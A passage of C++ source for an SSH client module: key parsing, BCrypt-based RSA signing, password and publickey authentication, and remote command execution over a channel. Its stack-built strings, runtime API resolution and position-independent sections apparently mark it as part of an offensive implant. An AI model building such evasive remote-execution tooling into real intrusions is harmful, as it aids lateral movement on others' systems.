    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    out->e = der + pos; out->e_len = tlen;
    if (out->e_len > 0 && out->e[0] == 0x00) { out->e++; out->e_len--; }
    pos += tlen;

    // d (skip - not needed for BCrypt private blob w/ p,q)
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    out->d = der + pos; out->d_len = tlen;
    if (out->d_len > 0 && out->d[0] == 0x00) { out->d++; out->d_len--; }
    pos += tlen;

    // p
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    out->p = der + pos; out->p_len = tlen;
    if (out->p_len > 0 && out->p[0] == 0x00) { out->p++; out->p_len--; }
    pos += tlen;

    // q
    if (!asn1_read_tag_len(der, der_len, &pos, &tag, &tlen)) return false;
    if (tag != 0x02) return false;
    out->q = der + pos; out->q_len = tlen;
    if (out->q_len > 0 && out->q[0] == 0x00) { out->q++; out->q_len--; }
    pos += tlen;

    return true;
}

// Read SSH mpint from buffer (big-endian uint32 length + data)
__attribute__((section(".text$B")))
static const uint8_t* ssh_read_mpint(const uint8_t* buf, uint32_t buf_len, uint32_t* pos,
    uint32_t* out_len)
{
    if (*pos + 4 > buf_len) return nullptr;
    uint32_t l = get_u32(buf + *pos); *pos += 4;
    if (*pos + l > buf_len) return nullptr;
    const uint8_t* p = buf + *pos;
    *pos += l;
    // strip leading zero byte
    if (l > 0 && p[0] == 0x00) { p++; l--; }
    *out_len = l;
    return p;
}

// Read SSH string from buffer
__attribute__((section(".text$B")))
static const uint8_t* ssh_read_string(const uint8_t* buf, uint32_t buf_len, uint32_t* pos,
    uint32_t* out_len)
{
    if (*pos + 4 > buf_len) return nullptr;
    uint32_t l = get_u32(buf + *pos); *pos += 4;
    if (*pos + l > buf_len) return nullptr;
    const uint8_t* p = buf + *pos;
    *pos += l;
    *out_len = l;
    return p;
}

// Parse OpenSSH private key format
__attribute__((section(".text$B")))
static bool parse_openssh_key(const uint8_t* data, uint32_t data_len, RsaKeyComponents* out) {
    // "openssh-key-v1\0" magic (15 bytes)
    const char magic[] = "openssh-key-v1";
    if (data_len < 15) return false;
    for (int i = 0; i < 15; i++) {
        if (data[i] != (uint8_t)magic[i]) return false;
    }

    uint32_t pos = 15;
    uint32_t slen = 0;

    // ciphername - must be "none"
    auto cipher = ssh_read_string(data, data_len, &pos, &slen);
    if (!cipher || slen != 4) return false;
    if (cipher[0] != 'n' || cipher[1] != 'o' || cipher[2] != 'n' || cipher[3] != 'e')
        return false;

    // kdfname
    ssh_read_string(data, data_len, &pos, &slen);
    // kdfoptions
    ssh_read_string(data, data_len, &pos, &slen);

    // number of keys
    if (pos + 4 > data_len) return false;
    uint32_t nkeys = get_u32(data + pos); pos += 4;
    if (nkeys < 1) return false;

    // public key blob (skip)
    ssh_read_string(data, data_len, &pos, &slen);

    // private section
    uint32_t priv_len = 0;
    auto priv = ssh_read_string(data, data_len, &pos, &priv_len);
    if (!priv || priv_len < 8) return false;

    uint32_t pp = 0;
    // checkint1, checkint2
    uint32_t c1 = get_u32(priv + pp); pp += 4;
    uint32_t c2 = get_u32(priv + pp); pp += 4;
    if (c1 != c2) return false;

    // key type string - must be "ssh-rsa"
    uint32_t kt_len = 0;
    auto kt = ssh_read_string(priv, priv_len, &pp, &kt_len);
    if (!kt || kt_len != 7) return false;

    // n, e, d, iqmp, p, q (OpenSSH order)
    out->n = ssh_read_mpint(priv, priv_len, &pp, &out->n_len);
    out->e = ssh_read_mpint(priv, priv_len, &pp, &out->e_len);
    out->d = ssh_read_mpint(priv, priv_len, &pp, &out->d_len);
    ssh_read_mpint(priv, priv_len, &pp, &slen); // iqmp - skip
    out->p = ssh_read_mpint(priv, priv_len, &pp, &out->p_len);
    out->q = ssh_read_mpint(priv, priv_len, &pp, &out->q_len);

    return out->n && out->e && out->p && out->q;
}

// Parse PEM key (PKCS#1 or OpenSSH format) and extract RSA components
__attribute__((section(".text$B")))
static bool parse_pem_rsa_key(instance& inst, const uint8_t* pem, uint32_t pem_len,
    RsaKeyComponents* out, uint8_t** decoded_buf, uint32_t* decoded_len)
{
    // Find base64 body between -----BEGIN and -----END markers
    const uint8_t* body_start = nullptr;
    const uint8_t* body_end = nullptr;
    bool is_openssh = false;

    for (uint32_t i = 0; i + 10 < pem_len; i++) {
        if (pem[i] == '-' && pem[i+1] == '-' && pem[i+2] == '-' && pem[i+3] == '-' && pem[i+4] == '-') {
            // find end of this line
            uint32_t eol = i + 5;
            while (eol < pem_len && pem[eol] != '\n' && pem[eol] != '\r') eol++;
            while (eol < pem_len && (pem[eol] == '\n' || pem[eol] == '\r')) eol++;

            // check for OPENSSH
            for (uint32_t j = i; j + 7 < eol; j++) {
                if (pem[j]=='O' && pem[j+1]=='P' && pem[j+2]=='E' && pem[j+3]=='N' &&
                    pem[j+4]=='S' && pem[j+5]=='S' && pem[j+6]=='H')
                    is_openssh = true;
            }

            body_start = pem + eol;
            break;
        }
    }
    if (!body_start) return false;

    // find -----END
    for (uint32_t i = (uint32_t)(body_start - pem); i + 10 < pem_len; i++) {
        if (pem[i] == '-' && pem[i+1] == '-' && pem[i+2] == '-' && pem[i+3] == '-' && pem[i+4] == '-' &&
            i > 0 && (pem[i-1] == '\n' || pem[i-1] == '\r')) {
            body_end = pem + i;
            // back up past newlines
            while (body_end > body_start && (body_end[-1] == '\n' || body_end[-1] == '\r')) body_end--;
            break;
        }
    }
    if (!body_end || body_end <= body_start) return false;

    uint32_t b64_len = (uint32_t)(body_end - body_start);
    uint32_t max_decoded = (b64_len * 3) / 4 + 4;
    *decoded_buf = static_cast<uint8_t*>(inst.heap_alloc(max_decoded));
    if (!*decoded_buf) return false;

    *decoded_len = base64_decode(body_start, b64_len, *decoded_buf, max_decoded);
    if (*decoded_len == 0) { inst.heap_free(*decoded_buf); *decoded_buf = nullptr; return false; }

    if (is_openssh)
        return parse_openssh_key(*decoded_buf, *decoded_len, out);
    else
        return parse_pkcs1_der(*decoded_buf, *decoded_len, out);
}

// Build BCRYPT_RSAPRIVATE_BLOB from key components and import
__attribute__((section(".text$B")))
static BCRYPT_KEY_HANDLE import_rsa_key(instance& inst, SshClientState* st, RsaKeyComponents* k) {
    if (!st->h_rsa) return nullptr;

    // BCRYPT_RSAPRIVATE_BLOB: header(24) + e + n + p + q
    uint32_t bit_len = k->n_len * 8;
    uint32_t half = k->n_len / 2;
    // p and q must be padded to half modulus size
    uint32_t p_pad = (k->p_len < half) ? half : k->p_len;
    uint32_t q_pad = (k->q_len < half) ? half : k->q_len;

    uint32_t blob_len = 24 + k->e_len + k->n_len + p_pad + q_pad;
    auto blob = static_cast<uint8_t*>(inst.heap_alloc(blob_len));
    if (!blob) return nullptr;
    memory::zero(blob, blob_len);

    // Header: Magic(4) + BitLength(4) + cbPublicExp(4) + cbModulus(4) + cbPrime1(4) + cbPrime2(4)
    uint32_t* hdr = reinterpret_cast<uint32_t*>(blob);
    hdr[0] = 0x32415352; // BCRYPT_RSAPRIVATE_MAGIC "RSA2"
    hdr[1] = bit_len;
    hdr[2] = k->e_len;
    hdr[3] = k->n_len;
    hdr[4] = p_pad;
    hdr[5] = q_pad;

    uint32_t off = 24;
    memory::copy(blob + off, (void*)k->e, k->e_len); off += k->e_len;
    memory::copy(blob + off, (void*)k->n, k->n_len); off += k->n_len;
    // right-align p within p_pad
    memory::copy(blob + off + (p_pad - k->p_len), (void*)k->p, k->p_len); off += p_pad;
    memory::copy(blob + off + (q_pad - k->q_len), (void*)k->q, k->q_len); off += q_pad;

    BCRYPT_KEY_HANDLE h_key = nullptr;
    wchar_t blob_type[] = { 'R','S','A','P','R','I','V','A','T','E','B','L','O','B', 0 };
    NTSTATUS status = st->pBCryptImportKeyPair(st->h_rsa, nullptr, blob_type, &h_key, blob, blob_len, 0);

    inst.heap_free(blob);
    if (status != 0) return nullptr;
    return h_key;
}

// Build ssh-rsa public key blob: string("ssh-rsa") + mpint(e) + mpint(n)
__attribute__((section(".text$B")))
static uint8_t* build_ssh_rsa_pubkey_blob(instance& inst, RsaKeyComponents* k, uint32_t* out_len) {
    // need leading zero if high bit set
    uint32_t e_pad = (k->e_len > 0 && (k->e[0] & 0x80)) ? 1 : 0;
    uint32_t n_pad = (k->n_len > 0 && (k->n[0] & 0x80)) ? 1 : 0;

    char key_type[] = "ssh-rsa";
    uint32_t kt_len = 7;

    uint32_t blob_len = 4 + kt_len + 4 + e_pad + k->e_len + 4 + n_pad + k->n_len;
    auto blob = static_cast<uint8_t*>(inst.heap_alloc(blob_len));
    if (!blob) return nullptr;

    uint32_t off = 0;
    put_u32(blob + off, kt_len); off += 4;
    memory::copy(blob + off, key_type, kt_len); off += kt_len;
    put_u32(blob + off, k->e_len + e_pad); off += 4;
    if (e_pad) blob[off++] = 0x00;
    memory::copy(blob + off, (void*)k->e, k->e_len); off += k->e_len;
    put_u32(blob + off, k->n_len + n_pad); off += 4;
    if (n_pad) blob[off++] = 0x00;
    memory::copy(blob + off, (void*)k->n, k->n_len); off += k->n_len;

    *out_len = blob_len;
    return blob;
}

// ─── Publickey Authentication (rsa-sha2-256) ─────────────────────────────────

__attribute__((section(".text$B")))
static bool ssh_auth_publickey(instance& inst, SshSession* sess) {
    auto st = get_state(inst);

    // Request ssh-userauth service
    const char svc[] = "ssh-userauth";
    uint32_t svc_len = 12;
    uint32_t sr_len = 1 + 4 + svc_len;
    auto sr = static_cast<uint8_t*>(inst.heap_alloc(sr_len));
    if (!sr) return false;
    sr[0] = SSH_MSG_SERVICE_REQUEST;
    put_u32(sr + 1, svc_len);
    memory::copy(sr + 5, (void*)svc, svc_len);
    if (!ssh_send_packet(inst, sess, sr, sr_len)) { inst.heap_free(sr); return false; }
    inst.heap_free(sr);

    uint8_t* resp = nullptr; uint32_t resp_len = 0;
    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "svc_accept") || !resp) {
        ssh_set_error(st, "pubkey auth: no SERVICE_ACCEPT"); return false;
    }
    if (resp[0] != SSH_MSG_SERVICE_ACCEPT) { inst.heap_free(resp); ssh_set_error(st, "pubkey auth: SERVICE_REQUEST rejected"); return false; }
    inst.heap_free(resp);

    // Parse PEM key
    RsaKeyComponents kc = {};
    uint8_t* decoded_buf = nullptr;
    uint32_t decoded_len = 0;
    if (!parse_pem_rsa_key(inst, sess->key_data, sess->key_len, &kc, &decoded_buf, &decoded_len)) {
        ssh_set_error(st, "pubkey auth: failed to parse PEM key");
        return false;
    }

    // Import RSA key into BCrypt
    BCRYPT_KEY_HANDLE h_rsa_key = import_rsa_key(inst, st, &kc);
    if (!h_rsa_key) {
        inst.heap_free(decoded_buf);
        ssh_set_error(st, "pubkey auth: BCrypt RSA import failed");
        return false;
    }

    // Build public key blob
    uint32_t pub_blob_len = 0;
    auto pub_blob = build_ssh_rsa_pubkey_blob(inst, &kc, &pub_blob_len);
    if (!pub_blob) {
        st->pBCryptDestroyKey(h_rsa_key);
        inst.heap_free(decoded_buf);
        ssh_set_error(st, "pubkey auth: failed to build pubkey blob");
        return false;
    }

    // Build the data to sign (RFC 4252 + RFC 8332)
    // string(session_id) + byte(50) + string(username) + string("ssh-connection") +
    // string("publickey") + boolean(TRUE) + string("rsa-sha2-256") + string(pub_blob)
    const char conn_svc[] = "ssh-connection";
    uint32_t conn_svc_len = 14;
    const char pk_method[] = "publickey";
    uint32_t pk_method_len = 9;
    const char sig_alg[] = "rsa-sha2-256";
    uint32_t sig_alg_len = 12;
    uint32_t user_len = str_len(sess->username);

    uint32_t sign_data_len = 4 + sess->session_id_len +  // string(session_id)
        1 +                                                // byte(50)
        4 + user_len +                                     // string(username)
        4 + conn_svc_len +                                 // string("ssh-connection")
        4 + pk_method_len +                                // string("publickey")
        1 +                                                // boolean TRUE
        4 + sig_alg_len +                                  // string("rsa-sha2-256")
        4 + pub_blob_len;                                  // string(pub_blob)

    auto sign_data = static_cast<uint8_t*>(inst.heap_alloc(sign_data_len));
    if (!sign_data) {
        inst.heap_free(pub_blob);
        st->pBCryptDestroyKey(h_rsa_key);
        inst.heap_free(decoded_buf);
        return false;
    }

    uint32_t off = 0;
    put_u32(sign_data + off, sess->session_id_len); off += 4;
    memory::copy(sign_data + off, sess->session_id, sess->session_id_len); off += sess->session_id_len;
    sign_data[off++] = SSH_MSG_USERAUTH_REQUEST;
    put_u32(sign_data + off, user_len); off += 4;
    memory::copy(sign_data + off, (void*)sess->username, user_len); off += user_len;
    put_u32(sign_data + off, conn_svc_len); off += 4;
    memory::copy(sign_data + off, (void*)conn_svc, conn_svc_len); off += conn_svc_len;
    put_u32(sign_data + off, pk_method_len); off += 4;
    memory::copy(sign_data + off, (void*)pk_method, pk_method_len); off += pk_method_len;
    sign_data[off++] = 1; // TRUE
    put_u32(sign_data + off, sig_alg_len); off += 4;
    memory::copy(sign_data + off, (void*)sig_alg, sig_alg_len); off += sig_alg_len;
    put_u32(sign_data + off, pub_blob_len); off += 4;
    memory::copy(sign_data + off, pub_blob, pub_blob_len); off += pub_blob_len;

    // SHA-256 hash the sign_data
    uint8_t hash[32];
    {
        BCRYPT_HASH_HANDLE h_hash = nullptr;
        if (inst.bcrypt_mod.BCryptCreateHash(st->h_sha256_plain, &h_hash, nullptr, 0, nullptr, 0, 0) != 0) {
            inst.heap_free(sign_data); inst.heap_free(pub_blob);
            st->pBCryptDestroyKey(h_rsa_key); inst.heap_free(decoded_buf);
            return false;
        }
        inst.bcrypt_mod.BCryptHashData(h_hash, sign_data, sign_data_len, 0);
        inst.bcrypt_mod.BCryptFinishHash(h_hash, hash, 32, 0);
        inst.bcrypt_mod.BCryptDestroyHash(h_hash);
    }
    inst.heap_free(sign_data);

    // Sign with RSA PKCS#1 v1.5 + SHA-256
    struct { LPCWSTR pszAlgId; } pad_info;
    wchar_t sha256_name[] = { 'S','H','A','2','5','6', 0 };
    pad_info.pszAlgId = sha256_name;

    ULONG sig_size = 0;
    // query signature size first
    st->pBCryptSignHash(h_rsa_key, &pad_info, hash, 32, nullptr, 0, &sig_size, 0x00000002 /*BCRYPT_PAD_PKCS1*/);
    auto raw_sig = static_cast<uint8_t*>(inst.heap_alloc(sig_size));
    if (!raw_sig) {
        inst.heap_free(pub_blob); st->pBCryptDestroyKey(h_rsa_key); inst.heap_free(decoded_buf);
        return false;
    }

    NTSTATUS sign_status = st->pBCryptSignHash(h_rsa_key, &pad_info, hash, 32,
        raw_sig, sig_size, &sig_size, 0x00000002 /*BCRYPT_PAD_PKCS1*/);
    st->pBCryptDestroyKey(h_rsa_key);
    inst.heap_free(decoded_buf);

    if (sign_status != 0) {
        inst.heap_free(raw_sig); inst.heap_free(pub_blob);
        ssh_set_error(st, "pubkey auth: BCryptSignHash failed");
        return false;
    }

    // Build signature blob: string("rsa-sha2-256") + string(raw_signature)
    uint32_t sig_blob_len = 4 + sig_alg_len + 4 + sig_size;
    auto sig_blob = static_cast<uint8_t*>(inst.heap_alloc(sig_blob_len));
    if (!sig_blob) {
        inst.heap_free(raw_sig); inst.heap_free(pub_blob);
        return false;
    }
    off = 0;
    put_u32(sig_blob + off, sig_alg_len); off += 4;
    memory::copy(sig_blob + off, (void*)sig_alg, sig_alg_len); off += sig_alg_len;
    put_u32(sig_blob + off, sig_size); off += 4;
    memory::copy(sig_blob + off, raw_sig, sig_size); off += sig_size;
    inst.heap_free(raw_sig);

    // Build USERAUTH_REQUEST packet
    uint32_t auth_pkt_len = 1 + 4 + user_len + 4 + conn_svc_len + 4 + pk_method_len +
        1 + 4 + sig_alg_len + 4 + pub_blob_len + 4 + sig_blob_len;
    auto auth_pkt = static_cast<uint8_t*>(inst.heap_alloc(auth_pkt_len));
    if (!auth_pkt) {
        inst.heap_free(sig_blob); inst.heap_free(pub_blob);
        return false;
    }

    off = 0;
    auth_pkt[off++] = SSH_MSG_USERAUTH_REQUEST;
    put_u32(auth_pkt + off, user_len); off += 4;
    memory::copy(auth_pkt + off, (void*)sess->username, user_len); off += user_len;
    put_u32(auth_pkt + off, conn_svc_len); off += 4;
    memory::copy(auth_pkt + off, (void*)conn_svc, conn_svc_len); off += conn_svc_len;
    put_u32(auth_pkt + off, pk_method_len); off += 4;
    memory::copy(auth_pkt + off, (void*)pk_method, pk_method_len); off += pk_method_len;
    auth_pkt[off++] = 1; // TRUE - has signature
    put_u32(auth_pkt + off, sig_alg_len); off += 4;
    memory::copy(auth_pkt + off, (void*)sig_alg, sig_alg_len); off += sig_alg_len;
    put_u32(auth_pkt + off, pub_blob_len); off += 4;
    memory::copy(auth_pkt + off, pub_blob, pub_blob_len); off += pub_blob_len;
    put_u32(auth_pkt + off, sig_blob_len); off += 4;
    memory::copy(auth_pkt + off, sig_blob, sig_blob_len); off += sig_blob_len;

    inst.heap_free(sig_blob);
    inst.heap_free(pub_blob);

    if (!ssh_send_packet(inst, sess, auth_pkt, auth_pkt_len)) {
        inst.heap_free(auth_pkt);
        ssh_set_error(st, "pubkey auth: failed to send USERAUTH_REQUEST");
        return false;
    }
    inst.heap_free(auth_pkt);

    // Wait for USERAUTH_SUCCESS or FAILURE
    while (true) {
        uint8_t* aresp = nullptr; uint32_t alen = 0;
        if (!ssh_recv_packet(inst, sess, &aresp, &alen, "userauth") || !aresp) return false;

        uint8_t msg_type = aresp[0];
        inst.heap_free(aresp);

        if (msg_type == SSH_MSG_USERAUTH_SUCCESS) {
            sess->authenticated = true;
            return true;
        }
        if (msg_type == SSH_MSG_USERAUTH_FAILURE) {
            ssh_set_error(st, "pubkey auth: USERAUTH_FAILURE (key rejected)");
            return false;
        }
        if (msg_type == SSH_MSG_USERAUTH_BANNER) continue;
        ssh_set_error(st, "pubkey auth: unexpected msg during auth");
        return false;
    }
}

// ─── Password Authentication ──────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool ssh_auth_password(instance& inst, SshSession* sess) {
    // Request ssh-userauth service
    const char svc[] = "ssh-userauth";
    uint32_t svc_len = 12;
    uint32_t sr_len = 1 + 4 + svc_len;
    auto sr = static_cast<uint8_t*>(inst.heap_alloc(sr_len));
    if (!sr) return false;
    sr[0] = SSH_MSG_SERVICE_REQUEST;
    put_u32(sr + 1, svc_len);
    memory::copy(sr + 5, (void*)svc, svc_len);
    if (!ssh_send_packet(inst, sess, sr, sr_len)) { inst.heap_free(sr); return false; }
    inst.heap_free(sr);

    // Receive SERVICE_ACCEPT
    uint8_t* resp = nullptr; uint32_t resp_len = 0;
    if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "svc_accept") || !resp) { auto st2 = get_state(inst); if (st2->last_error[0] == 0) ssh_set_error(st2, "auth: no SERVICE_ACCEPT response"); return false; }
    if (resp[0] != SSH_MSG_SERVICE_ACCEPT) { inst.heap_free(resp); ssh_set_error(get_state(inst), "auth: SERVICE_REQUEST rejected"); return false; }
    inst.heap_free(resp);

    // Send USERAUTH_REQUEST (password)
    const char method[] = "password";
    uint32_t method_len = 8;
    const char conn_svc[] = "ssh-connection";
    uint32_t conn_svc_len = 14;
    uint32_t user_len = str_len(sess->username);
    uint32_t pass_len = str_len(sess->password);

    uint32_t auth_pkt_len = 1 + 4 + user_len + 4 + conn_svc_len + 4 + method_len + 1 + 4 + pass_len;
    auto auth_pkt = static_cast<uint8_t*>(inst.heap_alloc(auth_pkt_len));
    if (!auth_pkt) return false;

    uint32_t off = 0;
    auth_pkt[off++] = SSH_MSG_USERAUTH_REQUEST;
    put_u32(auth_pkt + off, user_len); off += 4;
    memory::copy(auth_pkt + off, (void*)sess->username, user_len); off += user_len;
    put_u32(auth_pkt + off, conn_svc_len); off += 4;
    memory::copy(auth_pkt + off, (void*)conn_svc, conn_svc_len); off += conn_svc_len;
    put_u32(auth_pkt + off, method_len); off += 4;
    memory::copy(auth_pkt + off, (void*)method, method_len); off += method_len;
    auth_pkt[off++] = 0; // FALSE = not a password change
    put_u32(auth_pkt + off, pass_len); off += 4;
    memory::copy(auth_pkt + off, (void*)sess->password, pass_len); off += pass_len;

    if (!ssh_send_packet(inst, sess, auth_pkt, auth_pkt_len)) {
        inst.heap_free(auth_pkt);
        return false;
    }
    inst.heap_free(auth_pkt);

    // Wait for USERAUTH_SUCCESS or FAILURE
    // May get USERAUTH_BANNER first, skip it
    while (true) {
        uint8_t* aresp = nullptr; uint32_t alen = 0;
        if (!ssh_recv_packet(inst, sess, &aresp, &alen, "userauth") || !aresp) return false;

        uint8_t msg_type = aresp[0];
        inst.heap_free(aresp);

        if (msg_type == SSH_MSG_USERAUTH_SUCCESS) {
            sess->authenticated = true;
            return true;
        }
        if (msg_type == SSH_MSG_USERAUTH_FAILURE) { ssh_set_error(get_state(inst), "auth: USERAUTH_FAILURE (bad credentials)"); return false; }
        if (msg_type == SSH_MSG_USERAUTH_BANNER) continue;
        ssh_set_error(get_state(inst), "auth: unexpected msg during auth");
        return false;
    }
}

// ─── Channel Operations ────────────────────────────────────────────────────────

__attribute__((section(".text$B")))
static bool ssh_channel_open(instance& inst, SshSession* sess) {
    const char session_str[] = "session";
    uint32_t session_str_len = 7;

    sess->local_channel = 0;
    sess->remote_channel = 0;
    sess->remote_window = 0;
    sess->local_window = SSH_CHANNEL_WINDOW;
    sess->channel_open = false;
    sess->channel_eof = false;
    sess->channel_closed = false;
    sess->exit_status = -1;

    // SSH_MSG_CHANNEL_OPEN
    uint32_t pkt_len = 1 + 4 + session_str_len + 4 + 4 + 4;
    auto pkt = static_cast<uint8_t*>(inst.heap_alloc(pkt_len));
    if (!pkt) return false;

    uint32_t off = 0;
    pkt[off++] = SSH_MSG_CHANNEL_OPEN;
    put_u32(pkt + off, session_str_len); off += 4;
    memory::copy(pkt + off, (void*)session_str, session_str_len); off += session_str_len;
    put_u32(pkt + off, sess->local_channel); off += 4;
    put_u32(pkt + off, sess->local_window); off += 4;
    put_u32(pkt + off, SSH_CHANNEL_MAXPKT); off += 4;

    if (!ssh_send_packet(inst, sess, pkt, pkt_len)) { inst.heap_free(pkt); return false; }
    inst.heap_free(pkt);

    // Wait for CHANNEL_OPEN_CONFIRMATION (skip GLOBAL_REQUEST messages from server)
    for (int attempt = 0; attempt < 10; attempt++) {
        uint8_t* resp = nullptr; uint32_t resp_len = 0;
        if (!ssh_recv_packet(inst, sess, &resp, &resp_len, "chan_open") || !resp) return false;

        if (resp[0] == SSH_MSG_CHANNEL_OPEN_CONFIRM && resp_len >= 17) {
            sess->remote_channel = get_u32(resp + 5);
            sess->remote_window = get_u32(resp + 9);
            sess->channel_open = true;
            inst.heap_free(resp);
            return true;
        }

        if (resp[0] == SSH_MSG_GLOBAL_REQUEST) {
            // Check if want_reply is set - respond with REQUEST_FAILURE
            // Parse: string request_name, boolean want_reply, ...
            if (resp_len > 5) {
                uint32_t name_len = get_u32(resp + 1);
                uint32_t wr_off = 1 + 4 + name_len;
                if (wr_off < resp_len && resp[wr_off]) {
                    uint8_t fail_msg[1] = { SSH_MSG_REQUEST_FAILURE };
                    ssh_send_packet(inst, sess, fail_msg, 1);
                }
            }
            inst.heap_free(resp);
            continue;
        }

        if (resp[0] == SSH_MSG_CHANNEL_OPEN_FAILURE) {
            ssh_set_error(get_state(inst), "chan_open: server refused channel");
        }
        inst.heap_free(resp);
        return false;
    }
    return false;
}

__attribute__((section(".text$B")))
static bool ssh_channel_exec(instance& inst, SshSession* sess, const char* command) {
    const char exec_str[] = "exec";
    uint32_t exec_str_len = 4;
    uint32_t cmd_len = str_len(command);

    uint32_t pkt_len = 1 + 4 + 4 + exec_str_len + 1 + 4 + cmd_len;
    auto pkt = static_cast<uint8_t*>(inst.heap_alloc(pkt_len));
    if (!pkt) return false;

    uint32_t off = 0;
    pkt[off++] = SSH_MSG_CHANNEL_REQUEST;
    put_u32(pkt + off, sess->remote_channel); off += 4;
    put_u32(pkt + off, exec_str_len); off += 4;
    memory::copy(pkt + off, (void*)exec_str, exec_str_len); off += exec_str_len;
    pkt[off++] = 1; // want reply
    put_u32(pkt + off, cmd_len); off += 4;
    memory::copy(pkt + off, (void*)command, cmd_len); off += cmd_len;

    if (!ssh_send_packet(inst, sess, pkt, pkt_len)) { inst.heap_free(pkt); return false; }
    inst.heap_free(pkt);
    return true;
}

__attribute__((section(".text$B")))
static bool ssh_channel_read_all(instance& inst, SshSession* sess,
    uint8_t** out_data, uint32_t* out_len, uint32_t timeout_ms)
{
    uint32_t buf_cap = 65536;
    auto buf = static_cast<uint8_t*>(inst.heap_alloc(buf_cap));
    if (!buf) return false;
    uint32_t buf_len = 0;

    auto st = get_state(inst);
    uint32_t start_tick = 0; // we rely on recv timeout

    while (!sess->channel_eof && !sess->channel_closed) {
        uint8_t* pkt = nullptr; uint32_t pkt_len = 0;
        if (!ssh_recv_packet(inst, sess, &pkt, &pkt_len, "chan_data")) break;
        if (!pkt) break;

        uint8_t msg = pkt[0];

        switch (msg) {
        case SSH_MSG_CHANNEL_DATA: {
            if (pkt_len < 9) break;
            uint32_t data_len = get_u32(pkt + 5);
            uint8_t* data = pkt + 9;
            if (data_len > pkt_len - 9) data_len = pkt_len - 9;

            if (buf_len + data_len > buf_cap) {
                uint32_t new_cap = buf_cap * 2;
                while (new_cap < buf_len + data_len) new_cap *= 2;
                auto new_buf = static_cast<uint8_t*>(inst.heap_realloc(buf, new_cap));
                if (!new_buf) { inst.heap_free(pkt); goto done; }
                buf = new_buf;
                buf_cap = new_cap;
            }
            memory::copy(buf + buf_len, data, data_len);
            buf_len += data_len;

            // send window adjust if needed
            sess->local_window -= data_len;
            if (sess->local_window < SSH_CHANNEL_WINDOW / 2) {
                uint32_t adjust = SSH_CHANNEL_WINDOW - sess->local_window;
                uint8_t wa[9];
                wa[0] = SSH_MSG_CHANNEL_WINDOW_ADJUST;
                put_u32(wa + 1, sess->remote_channel);
                put_u32(wa + 5, adjust);
                ssh_send_packet(inst, sess, wa, 9);
                sess->local_window += adjust;
            }
            break;
        }
        case SSH_MSG_CHANNEL_EXTENDED_DATA: {
            if (pkt_len < 13) break;
            uint32_t data_len = get_u32(pkt + 9);
            uint8_t* data = pkt + 13;
            if (data_len > pkt_len - 13) data_len = pkt_len - 13;

            if (buf_len + data_len > buf_cap) {
                uint32_t new_cap = buf_cap * 2;
                while (new_cap < buf_len + data_len) new_cap *= 2;
                auto new_buf = static_cast<uint8_t*>(inst.heap_realloc(buf, new_cap));
                if (!new_buf) { inst.heap_free(pkt); goto done; }
                buf = new_buf;
                buf_cap = new_cap;
            }
            memory::copy(buf + buf_len, data, data_len);
            buf_len += data_len;
            break;
        }
        case SSH_MSG_CHANNEL_EOF:
            sess->channel_eof = true;
            break;
        case SSH_MSG_CHANNEL_CLOSE:
            sess->channel_closed = true;
            // send close back
            {
                uint8_t cl[5];
                cl[0] = SSH_MSG_CHANNEL_CLOSE;
                put_u32(cl + 1, sess->remote_channel);
                ssh_send_packet(inst, sess, cl, 5);
            }
            break;
        case SSH_MSG_CHANNEL_REQUEST: {
            // check for exit-status
            if (pkt_len > 13) {
                uint32_t req_type_len = get_u32(pkt + 5);
                const char exit_status_str[] = "exit-status";
                if (req_type_len == 11 && pkt_len >= 9 + 11 + 1 + 4) {
                    bool match = true;
                    for (int i = 0; i < 11; i++) {
                        if (pkt[9 + i] != exit_status_str[i]) { match = false; break; }
                    }
                    if (match) {
                        sess->exit_status = (int32_t)get_u32(pkt + 9 + 11 + 1);
                    }
                }
            }
            break;
        }
        case SSH_MSG_CHANNEL_WINDOW_ADJUST:
            if (pkt_len >= 9) {
                sess->remote_window += get_u32(pkt + 5);
            }
            break;
        case SSH_MSG_CHANNEL_SUCCESS:
        case SSH_MSG_CHANNEL_FAILURE:
            break;
        case SSH_MSG_GLOBAL_REQUEST:
            break;
        default:
            break;
        }

        inst.heap_free(pkt);
    }

done:
    *out_data = buf;
    *out_len = buf_len;
    return true;
}

// ─── Public API ────────────────────────────────────────────────────────────────

auto declfn starburst::ssh_client_init(instance& inst) -> bool {
    if (inst.ssh_state) return true;

    auto state = static_cast<SshClientState*>(inst.heap_alloc(sizeof(SshClientState)));
    if (!state) return false;
    memory::zero(state, sizeof(SshClientState));

    // Load ws2_32.dll
    char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
    state->h_ws2 = (HMODULE)inst.kernel32.LoadLibraryA(ws2_name);
    if (!state->h_ws2) { inst.heap_free(state); return false; }

    #define RESOLVE_WS(name) \
        { char fn[] = #name; \
          state->p##name = decltype(state->p##name)(inst.kernel32.GetProcAddress((HMODULE)state->h_ws2, fn)); \
          if (!state->p##name) { inst.heap_free(state); return false; } }

    RESOLVE_WS(WSAStartup)
    RESOLVE_WS(socket)
    RESOLVE_WS(connect)
    RESOLVE_WS(send)
    RESOLVE_WS(recv)
    RESOLVE_WS(closesocket)
    RESOLVE_WS(select)
    RESOLVE_WS(ioctlsocket)
    RESOLVE_WS(getaddrinfo)
    RESOLVE_WS(freeaddrinfo)
    RESOLVE_WS(WSAGetLastError)
    RESOLVE_WS(WSACleanup)
    RESOLVE_WS(htons)
    RESOLVE_WS(inet_addr)
    #undef RESOLVE_WS

    // Resolve BCrypt ECDH APIs from bcrypt module handle
    char bcrypt_name[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
    state->h_bcrypt = (HMODULE)inst.kernel32.LoadLibraryA(bcrypt_name);
    if (!state->h_bcrypt) { inst.heap_free(state); return false; }

    #define RESOLVE_BC(name) \
        { char fn[] = #name; \
          state->p##name = decltype(state->p##name)(inst.kernel32.GetProcAddress(state->h_bcrypt, fn)); \
          if (!state->p##name) { inst.heap_free(state); return false; } }

    RESOLVE_BC(BCryptGenerateKeyPair)
    RESOLVE_BC(BCryptFinalizeKeyPair)
    RESOLVE_BC(BCryptExportKey)
    RESOLVE_BC(BCryptImportKeyPair)
